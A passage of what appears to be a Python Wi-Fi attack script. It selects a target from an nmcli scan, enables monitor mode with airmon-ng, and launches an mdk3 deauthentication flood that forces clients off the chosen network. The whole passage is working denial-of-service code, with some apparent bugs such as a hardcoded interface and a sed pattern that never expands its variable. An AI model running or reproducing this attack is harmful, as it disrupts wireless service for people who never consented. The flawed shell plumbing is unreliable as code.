...
if way == 1:
  os.system("card=`cat card.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS2 $7}' | sed '/$choose/p; d' > targ")
  os.system('card=`cat card.sh` && airmon-ng start $card')
  
  os.system('card=`cat card.sh`mon && target=`cat targ` && mdk3 $card d -n "$target"')
  print("Wait..")
  os.system('card=`cat card.sh`mon && airmon-ng stop $card')
else:
  os.system("card=`cat card.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS2 $2}' | sed '2p; d' > targ")
